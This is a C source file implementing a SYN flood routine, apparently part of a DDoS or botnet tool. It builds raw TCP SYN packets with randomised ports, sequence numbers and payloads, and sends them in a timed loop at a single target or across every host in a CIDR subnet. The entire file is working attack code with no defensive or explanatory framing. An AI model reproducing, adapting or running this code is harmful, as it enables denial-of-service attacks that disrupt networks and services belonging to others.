#define _GNU_SOURCE
#include "headers/attack_params.h"
#include <stddef.h>
#include <stdint.h>

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (syn_sock < 0) {
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    const size_t ip_size = sizeof(struct iphdr);
    const size_t tcp_size = sizeof(struct tcphdr);
    const size_t min_packet_size = ip_size + tcp_size;
    int psize_min = params->psize_min > 0 ? (int)params->psize_min : (params->psize > 0 ? (int)params->psize : 40);
    int psize_max = params->psize_max > 0 ? (int)params->psize_max : psize_min;
    if ((size_t)psize_min < min_packet_size) psize_min = min_packet_size;
    if ((size_t)psize_max < min_packet_size) psize_max = min_packet_size;
    if (psize_max > 1500) psize_max = 1500;
    if (psize_max < psize_min) psize_max = psize_min;

    unsigned char packet[1500];
    struct iphdr* iph = (struct iphdr*) packet;
    struct tcphdr* tcph = (struct tcphdr*) (packet + ip_size);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    tcph->dest = params->target_addr.sin_port;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->fin = 0;
    tcph->urg = 0;
    tcph->window = htons(65535);
    tcph->urg_ptr = 0;

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep = usleep_min > 0;
    time_t end_time = time(NULL) + params->duration;
    
    if (params->cidr > 0) {
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in dest_sub = dest;
        while (params->active && time(NULL) < end_time) {
            size_t packet_size = psize_min == psize_max ? psize_min : psize_min + (rand() % (psize_max - psize_min + 1));
            unsigned char *data = packet + ip_size + tcp_size;
            size_t max_payload = sizeof(packet) > (ip_size + tcp_size) ? sizeof(packet) - (ip_size + tcp_size) : 0;
            size_t data_len = packet_size > (ip_size + tcp_size) ? packet_size - (ip_size + tcp_size) : 0;
            
            for (size_t i = 0; i < data_len; i++)
                data[i] = (unsigned char)(rand() & 0xFF);
            if (params->msg_len > 0 && params->msg) {
                size_t to_copy = params->msg_len < data_len ? params->msg_len : data_len;
                memcpy(data, params->msg, to_copy);
            }
            
            iph->tot_len = htons((uint16_t)packet_size);
            
            if (params->cidr == 32) {
                dest_sub.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_sub.sin_addr.s_addr;
                iph->id = htons((uint16_t)(rand() & 0xFFFF));
                tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                tcph->seq = htonl((uint32_t)rand());
                iph->check = 0;
                tcph->check = 0;
                iph->check = generic_checksum((unsigned short*)iph, ip_size);
                tcph->check = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else if (params->cidr == 31) {
                dest_sub.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_sub.sin_addr.s_addr;
                iph->id = htons((uint16_t)(rand() & 0xFFFF));
                tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                tcph->seq = htonl((uint32_t)rand());
                iph->check = 0;
                tcph->check = 0;
                iph->check = generic_checksum((unsigned short*)iph, ip_size);
                tcph->check = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
                
                dest_sub.sin_addr.s_addr = htonl(end);
                iph->daddr = dest_sub.sin_addr.s_addr;
                iph->id = htons((uint16_t)(rand() & 0xFFFF));
                tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                tcph->seq = htonl((uint32_t)rand());
                iph->check = 0;
                tcph->check = 0;
                iph->check = generic_checksum((unsigned short*)iph, ip_size);
                tcph->check = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_sub.sin_addr.s_addr = htonl(ip);
                    iph->daddr = dest_sub.sin_addr.s_addr;
                    iph->id = htons((uint16_t)(rand() & 0xFFFF));
                    tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                    tcph->seq = htonl((uint32_t)rand());
                    iph->check = 0;
                    tcph->check = 0;
                    iph->check = generic_checksum((unsigned short*)iph, ip_size);
                    tcph->check = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                    sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                }
            }
        }
    } else {
        while (params->active && time(NULL) < end_time) {
            size_t packet_size = psize_min == psize_max ? psize_min : psize_min + (rand() % (psize_max - psize_min + 1));
            unsigned char *data = packet + ip_size + tcp_size;
            size_t data_len = packet_size > (ip_size + tcp_size) ? packet_size - (ip_size + tcp_size) : 0;
            
            for (size_t i = 0; i < data_len; i++)
                data[i] = (unsigned char)(rand() & 0xFF);
            if (params->msg_len > 0 && params->msg) {
                size_t to_copy = params->msg_len < data_len ? params->msg_len : data_len;
                memcpy(data, params->msg, to_copy);
            }
            
            iph->tot_len = htons((uint16_t)packet_size);
            iph->id = htons((uint16_t)(rand() & 0xFFFF));
            tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
            tcph->seq = htonl((uint32_t)rand());
            iph->check = 0;
            tcph->check = 0;
            iph->check = generic_checksum((unsigned short*)iph, ip_size);
            tcph->check = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
            sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));
            if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
        }
    }
    close(syn_sock);
    return NULL;
}
